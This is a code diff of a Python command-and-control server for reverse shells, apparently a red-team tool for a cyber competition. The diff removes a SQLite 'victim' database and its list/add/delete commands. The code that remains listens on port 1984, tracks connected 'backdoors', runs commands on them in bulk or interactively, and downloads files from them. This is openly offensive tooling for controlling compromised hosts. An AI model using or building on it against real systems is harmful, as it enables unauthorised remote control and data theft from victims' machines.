@@ -1,64 +1,22 @@
 import argparse
-import sqlalchemy as db
 import signal
 from termcolor import colored
 import asyncio
-import daemon.pidfile
-import daemon
-import time
 import os
-import aiochannel
 import subprocess
 import aioconsole
 import ipaddress
 from typing import Optional
 import base64  
-SERVER_HOST = "0.0.0.0"
-SERVER_PORT = 1984
-BUFFER_SIZE = 16384
-
-
-
+import sys
+sys.path.insert(0, ".")
+from ncx_db import ip_range_parser
 engine = None
 metadata = None
 conn = None
-
-def ip_range_parser(ip_range_string):
-    #supported formats:
-    #192.168.*.3
-    #192.168.1.*
-    #192.168.1-225.*
-    octets = ip_range_string.split(".")
-    if len(octets) != 4:
-        return None
-    if octets[0] == "*":
-        octets[0] = "0-255"
-    if octets[1] == "*":
-        octets[1] = "0-255"
-    if octets[2] == "*":
-        octets[2] = "0-255"
-    if octets[3] == "*":
-        octets[3] = "0-255"
-    octets_possible = []
-    for octet in octets:
-        if "-" in octet:
-            octet_range = octet.split("-")
-            if len(octet_range) != 2:
-                return None
-            octets_possible.append(list(range(int(octet_range[0]), int(octet_range[1]) + 1)))
-        else:
-            octets_possible.append([int(octet)])
-    ips = []
-    if len(octets_possible[0]) * len(octets_possible[1]) * len(octets_possible[2]) * len(octets_possible[3]) > 10000:
-        print("Too many IPs to scan, please narrow your range")
-        return None
-    for octet0 in octets_possible[0]:
-        for octet1 in octets_possible[1]:
-            for octet2 in octets_possible[2]:
-                for octet3 in octets_possible[3]:
-                    ips.append(ipaddress.ip_address(str(octet0) + "." + str(octet1) + "." + str(octet2) + "." + str(octet3)))
-    return ips
-    
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT= 1984
+BUFFER_SIZE = 16384
 
 class ReverseShellManager:
     def __init__(self):
@@ -154,24 +112,7 @@ def signal_handler(sig, frame):
     print("\nDisallowed to exit with Ctrl+C, use the exit command\n")
     print(colored("DANGER: IF YOU EXIT THE SERVER, ALL BACKDOORS WILL BE DISCONNECTED", 'red'))
     print("> ", end='')
-    
-def list_victims(conn, victims):
-    # Get the victims
-    victims_query = db.select(victims)
-    # Execute the query
-    victims_result = conn.execute(victims_query)
-    # Print the results
-    print("Victims:")
-    print("\tID:\tIP:\t\tComment:\t")
-    print("--------------------------------------------------")
 
-    for victim in victims_result:
-        #print bullet point
-        print(colored("*", 'red'), end='\t')
-        print(colored(f"{victim[0]}", 'green'), end='\t')
-        print(colored(f"{victim[1]}", 'blue'), end='\t')
-        print(colored(f"{victim[2]}", 'yellow'))
-    print("--------------------------------------------------")
 def list_backdoors(rsm):
     # Get the victims
     backdoors = rsm.list_backdoors()
@@ -195,22 +136,6 @@ def list_backdoors(rsm):
 async def main():
     io_lock = asyncio.Lock()
     parser = argparse.ArgumentParser()
-    parser.add_argument('--db', type=str, default='./bermuda_state.db')
-    parser.add_argument('--listener', type=bool, default=False)
-
-    args = parser.parse_args()
-    # Connect to the database
-    engine = db.create_engine(f'sqlite:///{args.db}')
-    conn = engine.connect()
-    metadata = db.MetaData()
-    
-    victims = db.Table(
-        "Victim",
-        metadata,
-        db.Column("id", db.Integer, primary_key=True),
-        db.Column("ip", db.String),
-        db.Column("comment", db.String, default="")
-    )
     
     #register signal handler
     signal.signal(signal.SIGINT, signal_handler)
@@ -229,11 +154,6 @@ Go C3T, Beat Airforce
     for index, c in enumerate(banner):
         print(colored(c, colors[index % len(colors)]), end='')
         
-    
-    # Create the tables
-    metadata.create_all(engine)
-    
-    print(f"Connected to database located at {args.db}")
     
     rsm = ReverseShellManager()
     # Create the server
@@ -285,25 +205,7 @@ Go C3T, Beat Airforce
                     print(f"Error running command on {backdoor}")
                 else:
                     print(f"Command successfully run on {backdoor}")
-        elif command[0] == "list" or command[0] == "ls" or command[0] == "show":
-            list_victims(conn, victims)
-        elif command[0] == "new" or command[0] == "add" or command[0] == "create":
-            if len(command) < 2:
-                print("Usage: new victim_ip_or_hostname [comment]")
-                continue
-            # Create the new victim
-            comment = ""
-            if len(command) > 2:
-                comment = " ".join(command[2:])
-            conn.execute(victims.insert().values(ip=command[1], comment=comment))
-            list_victims(conn, victims)
-        elif command[0] == "delete" or command[0] == "del" or command[0] == "rm":
-            if len(command) < 2:
-                print("Usage: delete victim_id")
-                continue
-            conn.execute(victims.delete().where(victims.c.id == command[1]))
-            list_victims(conn, victims)
-        elif command[0] == "shells" or command[0] == "backdoors":
+        elif command[0] == "shells" or command[0] == "backdoors" or command[0] == "ls":
             list_backdoors(rsm)
         elif command[0] == "interact" or command[0] == "attach" or command[0] == "connect":
             if len(command) < 2:
@@ -391,10 +293,6 @@ Go C3T, Beat Airforce
                 print(f"File downloaded successfully to {directory}/{command[2]}")
         else:
             print(f"Unknown command {command[0]}")
-            
-        #commit changes
-        conn.commit()
-    conn.close()
     
 if __name__ == "__main__":
     asyncio.run(main())
